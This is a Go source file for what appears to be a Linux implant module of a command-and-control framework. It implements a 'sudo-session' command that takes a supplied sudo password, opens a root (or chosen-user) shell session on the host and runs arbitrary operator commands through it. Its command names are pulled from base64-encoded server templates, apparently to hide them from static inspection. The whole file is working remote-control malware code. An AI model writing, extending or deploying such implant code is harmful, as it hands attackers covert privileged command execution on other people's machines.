// server/docker/payloads/Linux/action_sudo_session_linux.go
//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// Timeout constants for sudo session commands
const (
	execCommandTimeout  = 5 * time.Second
	execAbsoluteTimeout = 6 * time.Second
)

// Template index constants (must match server-side common.go)
const (
	idxSudoSessCmdName         = 320 // sudo-session
	idxSudoSessStart           = 321 // start
	idxSudoSessStop            = 322 // stop
	idxSudoSessExec            = 323 // exec
	idxSudoSessExecStateful    = 324 // exec-stateful
	idxSudoSessEnableStateful  = 325 // enable-stateful
	idxSudoSessDisableStateful = 326 // disable-stateful
	idxSudoSessStatus          = 327 // status
	idxSudoSessDefaultUser     = 328 // root
)

// SudoSessTemplate holds parsed template data
type SudoSessTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
}

type SudoSessionCommand struct {
	tpl *SudoSessTemplate
}

// getTpl safely retrieves a template string by index
func (c *SudoSessionCommand) getTpl(idx int) string {
	if c.tpl == nil || idx >= len(c.tpl.Templates) {
		return ""
	}
	return c.tpl.Templates[idx]
}

// parseTemplate extracts and parses the template from command data
func (c *SudoSessionCommand) parseTemplate(ctx *CommandContext) {
	ctx.mu.RLock()
	cmd := ctx.CurrentCommand
	ctx.mu.RUnlock()

	if cmd == nil || cmd.Data == "" {
		return
	}

	// Decode base64
	decoded, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return
	}

	// Parse JSON
	var tpl SudoSessTemplate
	if err := json.Unmarshal(decoded, &tpl); err != nil {
		return
	}

	c.tpl = &tpl
}

// getActiveSession retrieves and validates the sudo session from context.
// Returns the session and an error message if not available or inactive.
func getActiveSession(ctx *CommandContext) (*SudoSession, string) {
	ctx.mu.RLock()
	sessionInterface := ctx.SudoSession
	ctx.mu.RUnlock()

	if sessionInterface == nil {
		return nil, Err(E30)
	}

	session := sessionInterface.(*SudoSession)

	// Use the session's own mutex to safely check isActive
	session.mu.Lock()
	active := session.isActive
	session.mu.Unlock()

	if !active {
		return nil, Err(E30)
	}

	return session, ""
}

func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from command data
	c.parseTemplate(ctx)

	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	subCommand := args[0]

	// Handle "start" subcommand
	if subCommand == c.getTpl(idxSudoSessStart) {
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		password := args[1]
		targetUser := c.getTpl(idxSudoSessDefaultUser) // Default to root

		// Check if a specific user was provided
		if len(args) >= 3 {
			targetUser = args[2]
		}

		// Check if session already exists (use helper for thread-safe check)
		if existingSession, _ := getActiveSession(ctx); existingSession != nil {
			return CommandResult{
				Output:      Err(E27),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Get working directory
		ctx.mu.RLock()
		workingDir := ctx.WorkingDir
		ctx.mu.RUnlock()

		// Start new session with specified user
		session, err := StartSudoSessionAsUser(password, targetUser, workingDir)
		if err != nil {
			return CommandResult{
				Output:      ErrCtx(E31, targetUser),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Store session in context
		ctx.mu.Lock()
		ctx.SudoSession = session
		ctx.mu.Unlock()

		// Build output message - handle nil cmd/Process
		pid := 0
		if session.cmd != nil && session.cmd.Process != nil {
			pid = session.cmd.Process.Pid
		}

		return CommandResult{
			Output:      SuccCtx(S4, fmt.Sprintf("%s|%d", targetUser, pid)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "exec" or "exec-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessExec) || subCommand == c.getTpl(idxSudoSessExecStateful) {
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return CommandResult{
				Output:      errMsg,
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// If exec-stateful, temporarily enable stateful mode
		if subCommand == c.getTpl(idxSudoSessExecStateful) {
			// Try to enable stateful if not already enabled
			session.mu.Lock()
			stateful := session.useStateful
			session.mu.Unlock()

			if !stateful {
				if err := session.EnableStatefulMode(); err != nil {
					return CommandResult{
						Output:      Err(E19),
						ExitCode:    1,
						CompletedAt: time.Now().Format(time.RFC3339),
					}
				}
			}
		}

		// Execute command with timeout protection
		command := strings.Join(args[1:], " ")

		type execResult struct {
			output   string
			exitCode int
			err      error
		}

		resultChan := make(chan execResult, 1)

		go func() {
			output, exitCode, err := session.ExecuteCommand(command, execCommandTimeout)
			resultChan <- execResult{output, exitCode, err}
		}()

		// Wait with timeout
		select {
		case result := <-resultChan:
			if result.err != nil {
				// Only show error if no output
				if result.output == "" {
					return CommandResult{
						Output:      Err(E25),
						ExitCode:    result.exitCode,
						CompletedAt: time.Now().Format(time.RFC3339),
					}
				}
			}

			return CommandResult{
				Output:      result.output,
				ExitCode:    result.exitCode,
				CompletedAt: time.Now().Format(time.RFC3339),
			}

		case <-time.After(execAbsoluteTimeout):
			return CommandResult{
				Output:      Err(E9),
				ExitCode:    124,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Handle "enable-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessEnableStateful) {
		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return CommandResult{
				Output:      errMsg,
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		if err := session.EnableStatefulMode(); err != nil {
			return CommandResult{
				Output:      Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output:      Succ(S3),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "disable-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessDisableStateful) {
		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return CommandResult{
				Output:      errMsg,
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session.SetStateful(false)

		return CommandResult{
			Output:      Succ(S3),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "status" subcommand
	if subCommand == c.getTpl(idxSudoSessStatus) {
		// For status, we check for session existence but don't require it to be active
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		return CommandResult{
			Output:      session.GetInfo(),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "stop" subcommand
	if subCommand == c.getTpl(idxSudoSessStop) {
		ctx.mu.Lock()
		sessionInterface := ctx.SudoSession

		if sessionInterface == nil {
			ctx.mu.Unlock()
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		targetUser := session.targetUser
		if targetUser == "" {
			targetUser = c.getTpl(idxSudoSessDefaultUser)
		}

		err := session.Close()
		ctx.SudoSession = nil
		ctx.mu.Unlock()

		if err != nil {
			return CommandResult{
				Output:      Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output:      SuccCtx(S5, targetUser),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Unknown subcommand
	return CommandResult{
		Output:      ErrCtx(E21, subCommand),
		ExitCode:    1,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
